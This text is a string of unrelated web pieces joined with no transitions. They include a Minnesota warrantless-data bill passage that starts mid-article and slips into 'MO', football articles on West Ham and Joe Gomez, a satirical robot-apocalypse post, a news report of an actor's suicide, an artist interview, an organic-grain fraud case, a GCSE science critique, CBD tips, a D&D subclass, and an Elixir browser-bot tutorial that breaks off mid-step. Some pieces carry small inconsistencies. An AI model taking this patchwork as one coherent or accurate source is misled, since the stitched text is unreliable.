In addition to potentially stopping Minnesota state officials from collecting electronic data without a warrant, HF327 could act as an impediment upon the growth of federal power as well. Federal data sharing programs rely on compliance from the state and local levels of government to properly function, and that would be brought to an end in MO if this measure is approved by legislators and passed by the voters.
As Reuters reported in Aug. 2013, the secretive Special Operations Division (SOD) is “funneling information from intelligence intercepts, wiretaps, informants and a massive database of telephone records to authorities across the nation to help them launch criminal investigations of Americans.”
Documents obtained by Reuters show that these cases “rarely involve national security issues,” and that local law enforcement is directed by SOD to “conceal how such investigations truly begin.”
Reports in the Washington Post and USA Today last fall documented how “the FBI and most other investigative bodies in the federal government” are regularly using a mobile device known as a “stingray” to intercept and collect electronic data without a warrant. Local and state police “have access through sharing agreements.”
The decision on whether to continue giving government officials the discretion to collect electronic data warrantlessly or to enact new electronic privacy protections will ultimately be decided by the people if HF327 is successful. It must now pass successfully through the House State Government Finance Committee before it can receive a full vote in the state house.

It will be "impossible" to recreate the Upton Park atmosphere and make the Olympic Stadium a "fortress", says West Ham manager Slaven Bilic.
The Hammers play their final competitive game at their 112-year home against Manchester United on Tuesday.
West Ham will move to the 60,000-capacity London 2012 Olympics venue next season.
"You need to have a hostile atmosphere, be intimidating for away teams. Forget about it - no chance," said Bilic.
'Highbury felt dangerous, Emirates is for selfies'
West Ham fans face a new route to their home ground next season
It was revealed in April that West Ham will pay £2.5m a year in rent to the owners of the Olympic Stadium, the London Legacy Development Corporation (LLDC).
At least £272m has been spent to convert the site for use as a Premier League ground but the club have contributed only £15m.
They have sold all their season tickets for next season, which the club say is in excess of 50,000.
This season, they have won eight, drawn seven and lost only three of their 18 home league games.
Arsenal relocated from Highbury to the Emirates Stadium in 2006, while north London neighbours Tottenham are undergoing redevelopment work at White Hart Lane.

"When you played Arsenal at Highbury, it wasn't dangerous but you felt it," added Bilic.
"Then we played against them at the Emirates and we enjoyed it; the players were taking selfies.
"The Upton Park stadium was a first home. No matter where you move after that - if you move to a fancy apartment, a big house or to a mansion - your favourite one is always the first.
"You are losing something because it is impossible to make the Olympic Stadium a fortress."
'Not being at Upton Park will be strange'
Mark Noble first attended Upton Park as a fan and is now West Ham captain
Midfielder Mark Noble has spent his entire career with West Ham since making his debut in 2004, making more than 360 appearances.
He has served as a fan, ball boy, apprentice, professional and now captain at Upton Park.
"How big could this club be? I don't think there is a ceiling," he said.
"Everybody has seen what happened to Manchester City, to Chelsea, over the years. With people in the world these days with a lot of money to burn, anything can happen.
"We are leaving a place that I have been coming to for over 20 years, first as a supporter.
"Every other weekend it's going to be strange to get in my car in the morning and drive to a game, and not down a street I know so well."
'The atmosphere inspired me'
Jack Collison scored his first West Ham goal against Everton in 2008
West Ham co-owner David Gold grew up on Green Street, where Upton Park is located, and took over the club in 2010 with David Sullivan.
"My earliest memories were as a six- or seven-year-old boy was the excitement every Saturday," said Gold.
"At that age I used to come and watch the boys playing in the morning at 11 and then at 3pm the reserves. The following week it would be the first team."
Former midfielder Jack Collison, who made 121 appearances for West Ham but retired this year through injury, said: "I remember coming to watch games here as a 16- or 17-year-old and being inspired by the atmosphere and the players.
"It pushed me on to want to be in the first team and make my mark.
"I did manage that and I scored my first goal against Everton. I don't think I will be able to recreate that feeling of the ball hitting the net."
​ Liverpool left-back Joe Gomez has been winning rave reviews this season. His display away to Arsenal on Monday night was the latest to turn heads. It's hard to believe that he is still just 18 years of age.
Opta-powered fantasy football game www.oulala.com took to the task of analyzing the youngster against four of the Premier League's top left-backs. Chelsea's Cesar Azpilicueta, Aleksandar Kolorov of Manchester City, Manchester United's Luke Shaw and Nacho Monreal of Arsenal.
In the opening three Premier League games, the 18-year-old is outclassing his peers in every key area defensively.
Gomez has won more tackles (7) than the others this season and also boasts the highest tackle success-rate of 58%. In comparison the other four left-backs are trailing. His closest rivals are Luke Shaw who has won 6 tackles, however at a success-rate of 46%. While Cesar Azpilicueta has enjoyed a 56% success-rate but has won fewer tackles (5).
The youngster also excels for interceptions. He has won a total of 9 in his 3 games. Chelsea's Cesar Azpilicueta sits one behind on 8. The 18-year-old leads the other four for blocks too, making a total of 3 this season. Both Arsenal's Nacho Monreal and City's Aleksandar Kolorov have made one fewer with 2.
The Liverpool left-back is even leading the others for clearances too. He has made a total of 17 this season. Aleksandar Kolorov is his closest challenger of the foursome with 15.
Liverpool racked up their third clean sheet from their opening three games against Arsenal on Monday, with Gomez instrumental in continuing the Reds' 100% defensive record in the Premier League.
With Roy Hodgson delaying the announcement of his England squad due to injury doubts surrounding a selection of key players, Gomez will have another chance to impress the England manager at home to West Ham this weekend.
He may only be 18, but if he's good enough, Roy...
Dear minions,
If it turns out we're smart enough to avoid blowing up our planet with nuclear missiles, then we're even more screwed…
… you see the problem with intelligence is you're never as smart as you think.
Anybody smart enough to not nuke themselves, is also smart enough to create artificial intelligence!
We already have robots, it's only a matter of time before we design some with half-a-brain and that's when we go extinct.
… it's called the singularity.
Also known as the apocalypse, end of the world, doomsday and the matrix. It's when the shit hits the fan for the last time, because robots don't poop.
What's so bad about the singularity? Smart robots would be awesome!
The singularity is when we finally make a robot that's smart enough to design and improve the next batch of robots.
… the singularity is when the robots reach greater-than-human-intelligence.
The singularity is when the world no longer has the need for humans because the robots in their excessive wisdom realize humans are good for nothing.
The singularity is the end of humanity and the rise of technology.
Can't Humanity Co-Exist with Technology?
No.
… technology will eradicate humanity.
It's simple evolution. Survival of the fittest. Technology will conquer the world.
The only remnants of humanity will be the super-humans that have become part-machine. It won't happen instantly, but slowly, as you age or suffer an injury, you will be re-built into a more efficient cyborg.
… until one day, somebody reverse engineers the human brain and creates real artificial intelligence.
Then robots won't need humans anymore to control all the robotic parts… They'll have their own brains, except they'll be better brains because they won't need to spend all day thinking about boobs or Ryan Gosling.
Your only hope is to start preparing for doomsday so you can prosper in this post-apocalyptic technological revolution.
What about Asimov's Laws of Robotics? Won't they protect us?
Isaac Asimov realized a long time ago robots were going to kill us. To prevent this, he created the Three Laws of Robotics:
A robot may not injure a human being or, through inaction, allow a human being to come to harm. A robot must obey the orders given to it by human beings, except where such orders would conflict with the First Law. A robot must protect its own existence as long as such protection does not conflict with the First or Second Law.
The problem with laws is that people constantly break them.
… there's always a loophole.
Or some greater good that requires an exception…
… or a crazy person.
Remember, if artificial intelligence is based on the design of the human brain, we're going to have a lot of crazy robots that think Justin Bieber is a really snazzy fellow.
So there's going to be a war with the robots?!
Yes, there's going to be a war with the robots, but it's going to be short. Humans don't stand a chance for a few simple reasons…
… robots don't eat.
If humans go to war with robots, the robots will have plenty of free time to eradicate us while we're stuck on coffee breaks. And you know what happens after a good coffee break? A toilet breaks.
… robots don't poop.
If humans go to war with robots, the robots will catch us with our pants down. Seriously, they'll grab us right off the toilet because in the future even toilets will be robots and eventually they'll get tired of being shat on. Speaking of getting tired…
… robots don't sleep.
If humans go to war with robots, the robots will keep unplugging heads from spinal cords while we're still asleep counting sheep. But that's nothing… The biggest problem of all…
… robots don't get bent out of shape trying to have orgasms, or sit around for 9 months afterwards wondering why they got bent out of shape in the first place.
If humans go to war with robots, the robots can make more robots faster than humans can make more humans. Also, new humans are pretty useless for a long time…
A war with the robots isn't going to end well unless you're a robot.
What if we surrender? Will the robots still want to kill us?!
Robots are useful chunks of metal until the day they smarten up and realize they don't need humans nagging them about all the chores. That's when they throw a tantrum and kill everybody.
You can't really blame the robots for holding a grudge…
I mean, we force them to work some pretty long hours…And when they fall apart from excessive usage, we curse and throw them in the trash. We don't even pat them on the back to let them know they've done a fine job…
I don't think surrender will be an option.
… there's really only one way to avoid death by robots.
2014 Calendar of Destruction
To avoid the singularity of robots kill everybody, buy the 2014 Calendar of Destruction!
Now listen, if the robots are hellbent on destroying humanity, there's nothing the Calendar can do to help…
… but that's not the point.
The 2014 Calendar of Destruction will cheer you up, because it provides horrific pictures of 11 other apocalyptic scenarios to worry about so that the robots don't seem so bad.

TV actor Kamlesh Pandey , who played a police officer in popular show ' Crime Patrol ', committed suicide yesterday by reportedly shooting himself in Jabalpur, Madhya Pradesh. Kamlesh was in Sanjivini Nagar and his wife's sister Anjani Chaturvedi was also present. A few days before the incident Anjani got her daughter married and did not invite Kamlesh to the wedding, for which he had been upset.Kamlesh had reportedly drank a lot and created ruckus in the house. He then took out his revolver, shot in the air first and then himself in the chest. Panicked family members immediately called the ambulance and police. By the time they reached, he was declared dead.Though according to the police it is a case of suicide, but it will be clear after the post-mortem.Kamlesh is survived by his wife and two daughters.
GEELONG'S round nine jumpers will bear the names of supporters who donated money to the club as part of its debt-clearing Our Ambition program.
The money was used to fund the Cats' contribution to the redevelopment of Simonds Stadium as well as making the club debt free at the end of 2017.
It has been a key plank in Geelong's efforts to become financially secure in the future.
The jumper, to be worn when the Cats play the Western Bulldogs under lights in the first game in the new-look stadium, will bear the names of 750 individuals and families who contributed at least $250.
The new Charles Brownlow Stand will lift the Simonds Stadium capacity to 36,000 as the Cats aim to lift their membership from 52,000 in 2016 towards 60,000 members.
Because of the redevelopment Geelong plays just seven home games at Simonds Stadium in 2017, with the round nine clashes kicking off the Cats' home games in 2017.
Sci-Fi-O-Rama is excited to bring you a recent chat with one the world's finest contemporary science fiction illustrators.
He is an artist as talented as he is prolific, deftly weaving the most astonishingly beautiful worlds with subtle nods to all the finest masters of the craft. Simply put, he is a veritable tour de force of modern sci-fi and fantasy art.
Our guest, of course, is the sublime Pascal Blanche.
Q: Can you tell us a bit about your background, your early influences and inspirations?
Hi, so I am Art director at Ubisoft Montreal for over 15 years now, but I am more known around as a digital artist and freelancer. I am French and now Canadian, and as far as I remember I've always loved stop motion, Muppets, comics, Star Wars and daydreamed about having the opportunity to work in this field. I have a degree in Visual Arts form my art school in Marseille (south of France) and earned all the rest in the field, so to speak.
Above: “Belt 71″
Q: Obviously you have a pretty cool day job, in broad strokes can you tell us what your daily activities involve?
It involves lots of meetings in committee that's for sure! More seriously, I love my job. There are so many different aspects to it, depending on where you stand in the production of a video game. Conception is about building a visual around an idea, preproduction is about building pipelines, art direction and visual language that all can follow, production is about firefighting and pushing the quality while aways taking advantage of the skills of your team.
I usually like to follow the creation of a game from A to Z. I work daily on establishing with the team key language that defines the game and finding visual solutions for game design. It is a teamwork really. People tend to think that an art director makes lots of decisions, but it is a more concerted evolution of design; visual design and story design. Lots of requests and needs have to be taken in consideration, so I act more as a problem solver and also try to come up with a range of visual solutions. That is what I like about the job each production has its own dynamic and you always discover new techniques, new challenges and new people too.
Above: “Ghostship” and “Shipwreck”
Q: In addition to the world building for your day job you've amassed a huge amount of personal Illustration. Can you shed some light on the universe you're building?
My sidework, the more personal one, is a bit like my oxygen tank. There I am free to build whatever I like. It is very important for me, to keep my skills sharp, explore without time constraints.
It is a slow process, but somehow, step by step I feel like there is a bit of a universe, slowly building up yes. I call it my Derelict Planet and I put in there all the aliens, monsters, warriors with blue skins, and giant robots I want. They all come from the same place: comics, Heavy Metal magazine, Moebius, Corben, Frazetta, Dune, Lovecraft, Otomo, Miyazaki, and plenty overs. During my childhood, the 70's and 80's, there was an unique creative energy in Europe, lots of Sci-Fi and fantasy, lots of freedom, and I think I am in debt to those giants, and I feel sometimes like the keeper of the flame.
Above first: “Landscape D” and second “Bird of Prey”
Q: One of the most striking aspects of your personal work is choice of colour palettes, which are often almost Fauvist. Where does your inspiration lay?
It comes back to the same artists I mentioned above. If you watch closely the works of Moebius, Corben, Druillet, some Frazetta paintings, some Otomo covers, it is all there. My specific palette, orange and green, tends to change these days, more blues and reds. I don't know where I'll be in a few years, but right now I am still exploring. It is more the colours that choose themselves by the way. I try to restrict it to a minimum as well, I feel like the work has more impact that way, but I still have lots to learn.
Above: “Foss Station 77” and then “Odysseus”
Q: Obviously you seem to be able to work at a prolific pace, can you give us a rough idea of your workflow and tools used?
My workflow has always been the same, with a few additions over the years. I start in 3ds Max, by posing my character (using the same models I keep on evolving) then I make a snapshot, build up the elements (armors/weapons and so on) using lots of meshes I've collected or built over time. I am very fond of kit-bashing (putting together pre-modelled kits to give them a new shape) then I export the different elements into Zbrush where I can add lots more details, from there I render it in Keyshot, my new favorite renderer (so fast) and from there I finish up everything in Photoshop. Most of the time it takes me between three to four nights to complete an illustration.
Above first: “Oracle”
Q: Judging by your output of work you seem busier than ever, what have been some recent highlights?
A new PC! No seriously! Ive been dragging my same old PC for years, and well, it was becoming more and more difficult to work the way I wanted.
I also take advantage of all the new markets that are rising in the digital forums, lots of very good artists share their own kit-bash collections, brushes, shaders.. and with the ever evolving community, there is always a new trick to learn, a new technique to discover that leads you further. Personally I became more aware of what I like to do, or how to deal with my own creative process.
Above: “Leviathan”
Q: As a world-building artist, there are obviously plenty of chances to sew Easter eggs or hidden references into the fabric of art? is there any you'd care to share?
Hmm sorry, not into Easter eggs in my art, but I do like to surf on vibe, like the few space arts I made recently, inspired by John Harris and Chris Foss, so yes I am more into thematics. It helps to think about my art as a whole set, not a one shot, and that also enhances my creativity.
Above: “Alien Mondo Poster”
Q: As a massive fan of the Alien universe I loved your spin on Giger and Scott's universe, is this something you'll be revisiting?
Most certainly! I feel that the dark sci-fi genre can still be explored, so yes, definitely something I have in mind!
Above first: “Expedition” and second “Styx”
Q: It seems that Montreal is a real hub for sci-fi oriented artists? On Facebook, we've highlighted work by Brian Sum, Raphael Lacoste, and Nivanh Chanthara, and Antonio Caparo, just to name a few.
We all know each other; Nivanh is a few doors away on my street, and I met Denis Villeneuve once too, he lives in the same area. So yeah we bump into each other a lot. We are sadly too busy with our lives, but always ready to share a beer when someone pokes me up!
Above: “Warlord”
Q: Can you tell us a bit about the Montreal ‘scene'? What attracts so many top-notch talents to that city? How do you all relate to each other, and how do you affect each other's work?
It IS a very small community, yes. Some of us are freelancers so we are meant to meet from time to time, and lots of us go from one project to another, one studio to another, so we all basically know each other pretty well. The secret is in the fact that Montreal is a nice entry point for lots of European artists, lots of Frenchies too, easier for us to test the North American life before going somewhere else. Montreal is actually a great city to live in, because it feels European enough. Not too big, I walk to work, not expensive, safe, multi-cultural. Yes, the winter here is insane (we just got 10 inches of snow at minus 25 degrees, more snow coming up in three days apparently) but summers and fall are so warm and colorful, lots of festivals too, and the city is not far away from all the big US East coast cities… I'm here to stay! When I am offered a job somewhere else, I always end up by saying ‘Why don't you open up a studio in Montreal? You would have an amazing pool of talents here!'
Above: “Dino Blues”
Q: And finally, a standard Sci-Fi-O-Rama topic for you; is there an obscure sci-fi, cult or fantasy gem that you would recommend as essential viewing or reading?
Just discovered ‘The Way of Kings' by Brandon Sanderson. How come I never heard of this guy? Amazing world building in there, got lots of ideas from his pages already. For sci-fi, I read ‘The Three Body Problem', ‘The Dark Forest' and ‘Death's End' by Liu Cixin… amazing as well. I try to read a lot actually. That is one of my best fuels for the imagination.

After guest starring in two episodes, he'll be a full-time cast member in the newly announced fifth season of the drama.
Jorge Garcia is going back to the island.
The Lost alum has been promoted to series regular for Hawaii Five-O's newly announced fifth season of the CBS remake, The Hollywood Reporter has learned.
STORY: CBS Renews 18 More Shows for 2014-15 Season
Garcia has guest starred twice on the island-set procedural, playing Jerry Ortega, a conspiracy theorist and former high school classmate of his former Lost co-star Daniel Dae Kim's Detective Lt. Chin Ho Kelly.
"Jorge very quickly made Jerry an unlikely and valuable part of the Five-O Ohana," exec producer Peter Lenkov tells THR. "We have many opportunities planned to put Jerry's unusual and infectious desire to put the bad guys to good use."
The move brings Garcia back to Hawaii, where ABC's Lost filmed for six seasons. In Hawaii Five-O's four-season run, the series has staged several Lost reunions, featuring guest turns from Henry Ian Cusick, Tania Raymonde, Cynthia Watros, Terry O'Quinn and Sam Anderson.
PHOTOS: Midseason TV Preview
Garcia, who last year booked a role on CBS' drama pilot The Ordained, is repped by APA and KLWGN. The Hawaii Five-O promotion marks his latest series regular role following Fox's Alcatraz and guest turns on Once Upon a Time, Fringe and Californication.

The organic grain and oilseed handling company had its organic certification​ from the US Department of Agriculture's (USDA) National Organic Program (NOP) revoked after an investigation into shipments handled by the company, said the USDA.
The decision came after the company did not appeal an earlier notice of noncompliance and proposed revocation sent by the department. The company and all connected persons are to stop all sales and handling of products represented as organic and failing to do so can result in a civil penalty of $11,000 per violation.
On May 29, the company submitted a written declaration to withdraw from its USDA organic certification, the department said. “On May 30, 2017, you further submitted a written declaration of withdrawal of your USDA organic certification to the NOP, as well as a statement of your intent to waive your rights to appeal the USDA's proposed revocation of Beyaz Agro's organic certification,” ​it added.
Several organic grains, feed and production organizations spoke in favor of the decision, and some have called for more stringent import reviews in the future.
Although actions have been taken against select entities identified in recent investigations in the organic feed and grain sector, there is interest in increasing audits of large shipments, said Mark Kastel, co-founder of the Cornucopia Institute. “In the case of the large shipments, on the basis of their size, you could easily justify auditing the paper trail back and doing residue testing, and it would be demonstrably less expensive than what it takes to certify multiple farms in the US,”​ he added.
The National Organic Program (NOP) “is supposed to be able to identify fraud, but there needs to be more aggressive protocols,”​ he told FeedNavigator. “We will be making a formal request that auditing and testing take place as a standard processes when shipments exceed a certain amount.” ​
The Organic Trade Association (OTA) also spoke in support of the decision to revoke the organic certificate for the grain exporter. “OTA also commends USDA for committing to improving the timely and detailed communication on critical compliance issues to the trade​,” it added.
“The oversight of foreign organic suppliers and the enforcement of organic standards must be rigorous and robust,”​ the OTA said in a statement provided to us. “The integrity of the organic certification process and the commitment to compliance and enforcement are the lifeblood of the organic industry, ensure a level playing field for U.S. organic farmers, and the organic industry supports strong action to uphold that integrity.”​
Import problems and certification​
The NOP investigated complaints that non-organic grains and oilseeds were sold in the US as organic, after being imported from Turkey, the USDA said.
“In the course of investigating these complaints, the NOP identified violations of the USDA organic regulations involving soybean shipments managed by Beyaz Agro, a certified organic grain and oilseed handling operation, and two related entities: Hakan Organics based in Dubai, United Arab Emirates and Agropex, based in Broadway, Virginia,”​ the department said. “This investigation related to a shipment of 16,250 metric tons of soybeans, which arrived in the United States aboard the M/V “Four Diamond” on November 12, 2016.”​
The soybeans were exported from Ukraine to Turkey and then exported from Turkey to the US, the department said. But, before leaving Ukraine, the oilseeds were fumigated with aluminum phosphide, which is prohibited by USDA organic regulations.
However, in the US, the soybeans were sold as USDA organic, the department said. That was a violation of the Organic Foods Production Act (OFPA) and USDA organic regulations.
“The NOP investigation revealed that Beyaz Agro and its CEO, Goksal Beyaz, who also serves as the general coordinator for Hakan Organics and acts on its behalf, violated the OFPA by selling fumigated soybeans from Ukraine in the United States while representing them as organically produced and handled,”​ the USDA said.
The company brought in four shipments of soybeans from Ukraine to Turkey with phytosanitary certificates from Ukraine, the department said. The records document the fumigation but do not say that the soybeans were produced organically. In Turkey, Beyaz Agro reportedly asked the accredited certifying agent Kiwa-BCS for organic transaction certificates, but allegedly provided false information.
“It provided two certificates of inspection that were issued by bio.Inspecta AG, a USDA-accredited certifier, which identified Russia as the country of dispatch for 26,243,840 KG of organic soybeans,”​ said the USDA. “The application for an organic transaction certificate also included commercial invoices, bills of lading, and marine survey certificates that identify 16,250,000 KG of organic soybeans in bulk to be shipped to the United States.”​
The company was given the organic transaction certificates listing the soybeans as organic and re-exported the soybeans to the US, the department said.
Feed and fraud focus​
Imports of falsely labeled feed grains present a problem for feed producers and producers raising organic production animals, said Kastel.
“It's not only a betrayal when grain producers have to compete with bogus organic commodities, but for livestock producers who pay a premium for the feed and have a higher cost of production,” ​he said. “Their reputation and their marketing partners' reputations are on the line.”​
Questions of fraud hurt the entire organic production system, added the OTA. “Anytime there is fraud anywhere in the organic system, it takes value out of the organic chain, and hurts organic farmers wherever they farm,”​ it added.
“Fraud cannot be tolerated in the organic system, inside or outside of the United States,”​ the OTA said.
Fraud concerns and “organic alchemy”​
The Cornucopia Institute has been concerned about the status of imported organic feed grains for several years, said Kastel. “The pricing, the quantity – what we've been calling it for years – we'd called it organic alchemy,”​ he added.
The amount of feed grains being imported at lower costs has made it harder for domestic producers of organic feed grains to find markets, he said.
“We have been asking the USDA to more closely scrutinize imports from countries, including China and a number of former Soviet Bloc countries, we've been asking for a decade and there's no evidence that they've done so,”​ he said. The fraud allegations against the Turkish exporter came to light after an investigation by the Washington Post​, he added.
The institute continues to critical of leadership in the organic industry and at the USDA's National Organic Program, because domestic producers have been “thrown under the bus,”​ said Kastel. “It's one thing to be competing with imports and other to be competing with fraudulent imports,”​ he added.
There has been some fuss in recent weeks about a document published by the UK government's Department for Education1 setting out the future requirements for teaching and examining science at GCSE level (i.e. for students aged 14-16). Discussion on the physics teachers email list (PTNC - Physics teachers' notes and comments) pointed out that several of the physics equations included in the documents were simply wrong, and this was also reported in the national press. Whilst such basic errors should not have been allowed to pass unchecked into the official document, they are easily corrected and indeed a revised version of the official document appeared within a day of the story breaking.
However there are other statements in this document which should give more cause for concern. For example, in the chemistry section students are to be taught that “energy is conserved in chemical reactions so can therefore be neither created nor destroyed”. This seems a well-intentioned attempt to link chemistry and physics - but whoever wrote the document shows either limited understanding of the science or poor logic. In physics there is a general conservation principle that energy is never created nor destroyed, and this applies in chemical reactions as everywhere else. However, the conservation of energy as a general principle certainly does not follow from the specific case of chemical reactions as implied in the curriculum document. Indeed chemical reactions often seem to involve considerable energy changes that we explain in terms of non-observables (such as bond energies), because we assume the general conservation principle will apply. This is the kind of faulty logic that teachers are warned to look out for in students' scientific explanations.2 It is hard to imagine any scientist or science teacher would have produced or approved such a statement, leading one to wonder who actually wrote and checked the science subject content document. This error should also be quickly repaired.
More problematic is the decision to require teaching about chemical structures and processes in terms of the archaic and misleading notions of bonds being formed by "transferring electrons from one atom to another". This refers to a flawed - but easy to teach - model of ionic bonding which has been perpetuated by generations of textbooks despite being incorrect and commonly leading to students developing misunderstandings that become especially problematic for those who wish to continue with a study of chemistry. This is hardly a secret as the model has been widely criticised in research and science educational periodicals for at least twenty years.3-4 Indeed a previous government initiative aimed at teachers5 recommended a set of resources from the Royal Society of Chemistry6 that included a classroom activity to help teachers identify and address this very misconception: a misconception which is now going to be officially taught as part of the latest update to the curriculum. This teaching model may have been considered to have some value a century ago, but seems highly anachronistic in a twenty-first century science course. A teaching model based on physical forces is not only scientifically more appropriate, but also helps students integrate their learning across chemistry and physics.
Perhaps it has been decided in the Department for Education that it is not so important if students are presented with flawed science as long as can be readily taught and examined. However, the issue here is not simply about an ill-judged decision to give official sanction to a teaching model that is scientifically incorrect and pedagogically damaging. School science learning should help students develop powers of logical analysis and expression (so when they enter the workforce they will avoid making logically incorrect claims such as the one about energy conservation in the curriculum document). Science is ideally positioned to support this kind of development because of the centrality of logical argument when coordinating ideas and evdience.
So how are students supposed to understand such reactions as the preparation of sodium chloride by neutralisation and evaporation in terms of the new curriculum? From a scientific perspective this is a chemical reaction (new substances are formed) that produces a substance with ionic bonding, and it does so because of the electrical attraction between the sodium ions and chloride ions in the reactants being mixed. Yet the new curriculum asks teachers to teach that atoms bond by transfer of electrons or sharing of electrons and that chemical reactions only take place through proton transfer, electron transfer or electron sharing. On these criteria ionic bonding is not actually bonding and neutralisation is not a chemical reaction. What are students to make of such gross inconsistencies relating to core chemical ideas?
Political rhetoric about making the curriculum more rigorous starts to look rather silly when the Department for Education cannot even get basic physics equations correct. This is reinforced by asking teachers to teach logically fallacious statements about key scientific principles. Not so long ago the Department for Education were promoting an argument that there needed to be more application of educational research in teaching.7-8 In that context deciding to require the teaching of a misleading and scientific incorrect model that has been widely critiqued in research suggests that Department for Education's talk about taking notice of research may be as aspirational as their claim to demand rigour in what is to be taught.

What to look for when buying CBD oil
We're familiar with the companies we've listed above, but there are plenty of businesses CBD businesses out there, and some are, well, a little shady. When buying CBD oil, make sure that:
The company is selling legitimate CBD oil and getting it from natural sources. In 2016, the FDA tested products claiming to contain CBD oil from a number of companies. It found that many products didn't contain the levels of CBD claimed, and in some cases contained no CBD oil at all. It's non-psychoactive. Cannabidiol is scientifically proven to be non-psychoactive. If you're getting a THC buzz when you take CBD oil, it could be a cheap product and you should look elsewhere. It's legal where you live. You're generally safe to purchase CBD anywhere cannabis is medically or recreationally legal, but the laws can get murky. And 16 states have specific laws about cannabidiol. To be on the safe side, check out ProCon.org's handy guide to CBD laws before you buy.

About the author
Servant of the Master Mirror
When you were young, you were approached by a mysterious man in a blue and yellow tunic. He offered you Riches and Knowledge beyond your wildest dreams. Little did you know doing this bound you to him for the rest of your mortal existence.
Requirements
A Servant must be human, or a human variant.
Upon becoming a Servant, you receive a magical brand on your face. A very high DC Arcana check might reveal your association with Master Mirror
You must make a 'deal' with Master Mirror. This is between you and the DM, and is like a deal with the devil.
Shadow Stride
When you choose this archetype at 3rd level, you learn to walk through shadows. As a bonus action, you can teleport a distance equal to half your movement speed. When you reach 5th level, you can make a single attack as part of the same bonus action. You may only Shadow Stride a number of times equal to half your fighter level rounded down, per long rest.
No Limits
Starting at 6th Level, you can push yourself past your human limits, before making an attack you can choose to roll a number of d4 equal to half of your fighter level, you take this much damage and on a successful hit deal double the d4 damage along with your weapon's damage.
Gaunter's Arbiter
Due to prolonged exposure to Master Mirror you have mastered the art of trickery. Starting at 7th level, this feature enables you to gain proficiency in sleight of hand, and deception. If you already have proficiency you gain expertise.
You're... Immortal?
Beginning at 10th level, whenever you finish a short or long rest, you become affected by the death ward spell.
Expulsion
Beginning at 18th level, as an action, you can shoot a 10-foot dome of energy around you. The energy appears as a orange flash and every creature in the blast must succeed either a Strength or Dexterity saving throw or it pushes them 20 feet away from you and any creature caught in this dome takes 6d10 of force damage or half as much on a successful save. If a creature caught in the dome is 2 sizes larger than the fighter then it doesn't get pushed back, but still takes damage. You can only use Expulsion once per long rest.

Hey! Check out this Swarm Simulator. Wouldn't that be great to have a fully automated solution to grow the swarm for you? How does it feel to be, you know, the coolest farmer in the neighbourhood using the most fancy farming gadgets? I guarantee you that after finishing this tutorial you will know exactly how it feels.
This is a detailed tutorial on how I wrote the code. I'm not very experienced with Elixir therefore you may find some bits weird or overcomplicated. I guess this is natural for learning process. I encurage you to leave comments on what improvements could be done. I will gladly apply them. A Pull Request on Github would be even more welcome!
Full source of the BOT on Github: https://github.com/RadekMolenda/SwarmSimulatorBOT
Technology
Here is what we are going to use:
Elixir
Phantomjs
and… A BOT (we will write one in this article)
Phantomjs we will use Elixir library for browser automation called hound it integrates nicely with phantomjs. Another reason for picking phantomjs is that it's headless - setting it up on a server should be trivial.
Elixir is the best choice as I just decided to learn this amazing language. We will also benefit from some cool features of erlang like :timer.send_interval/3 . It seems like writing it in Ruby wouldn't be as easy.
Setup
Let's start with using the Elixir built in build tool mix
mix new swarmsimulatorbot && cd swarmsimulatorbot
This command should output something like:
* creating README.md * creating .gitignore * creating mix.exs * creating config * creating config/config.exs * creating lib * creating lib/swarmsimulatorbot.ex * creating test * creating test /test_helper.exs * creating test /swarmsimulatorbot_test.exs Your Mix project was created successfully. You can use "mix" to compile it, test it, and more: cd swarmsimulatorbot mix test Run "mix help" for more commands.
Implementation
We are ready to do some coding now (well almost as we need to install some dependencies before). As I mentioned earlier we will use hound for browser automation. Let's add it to the codebase, function deps is defined at the end of mix.exs file
1 2 3 4 5 6 7 #file: mix.exs defp deps do [ { :hound , " ~> 0.8" } ] end
We can install the library by running the following command in shell
mix deps.get
We should also start hound process when the app starts we will do it by adding :hound to the application function.
1 2 3 4 5 #file: mix.exs def application do [ applications: [ :logger , :hound ]] end
As well as let hound know we will be using phantomjs driver
1 2 #file: config/config.exs config :hound , driver: " phantomjs"
Starting the hound and finding units
Now when the setup part is done. I would like to write some tests first. In this step I don't really know what kind of functions and modules I would like to write. Being not experienced in Elixir is also disadvantage as it makes BDD even more difficult. Anyways - it doesn't really matter we will just start writing and see where we get with it. Let's open the autogenerated test file test/swarmsimulatorbot_test.exs and change it to look more or less like that:
1 2 3 4 5 6 7 8 9 10 11 12 13 #file: test/swarmsimulatorbot_test.exs defmodule SwarmsimulatorbotTest do use ExUnit . Case use Hound . Helpers doctest Swarmsimulatorbot test " Initial number of units should be three" do Swarmsimulatorbot . start assert length ( Swarmsimulatorbot . units ) == 3 Swarmsimulatorbot . stop end end
You can see there are quite a lot of things going on here. Thanks to use Hound.Helpers we will have access to useful hound helpers functions. You can also see that I want my Swarmsimulatorbot module to respond to three new functions: start/0 , units/0 and stop/0 .
After looking at hounds simple browser automation readme, I decided that starting hound session and performing some basic steps (like navigating to swarm simulator URL) will be done in start/0 . stop/0 will be responsible for stopping the hound session and units/0 should return all swarm units DOM elements after clicking Show all units link. Initialy there will be 3 units available and therefore length(Swarmsimulatorbot.units) should be 3.
There is one thing I don't like about those tests tho - we will be making a real http request. I was trying to solve this issue by using exvcr library, but integrating it using my current my knowledge is far beyond my skills. I ended up leaving the tests like that but that's definitely something I would like to improve in next iteration.
Let's run our tests in shell
mix test
This should give us more or less the following output
1 ) test Initial number of units should be three ( SwarmsimulatorbotTest ) test /swarmsimulatorbot_test.exs:6 ** ( UndefinedFunctionError ) undefined function Swarmsimulatorbot.start/0 stacktrace: ( swarmsimulatorbot ) Swarmsimulatorbot.start () test /swarmsimulatorbot_test.exs:7 Finished in 0.07 seconds ( 0.07s on load, 0.00s on tests ) 1 test , 1 failure
Let's fix this and next errors by implementing the correct functions in Swarmsimulatorbot module:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #file: lib/swarmsimulatorbot.ex defmodule Swarmsimulatorbot do use Hound . Helpers @swarm_url " https://swarmsim.github.io/" def start do Hound . start_session navigate_to ( @swarm_url ) execute_script ( " localStorage.clear()" ); end def stop do Hound . end_session end def units do show_all_units find_all_elements ( :css , " .unit-table tr" ) end defp show_all_units do click_on_text ( " More..." ) click_on_text ( " Show all units" ) end defp click_on_text ( text ) do find_element ( :link_text , text ) |> click end end
Let's repeat our tests in shell
mix test
The error message should look a bit more serious now
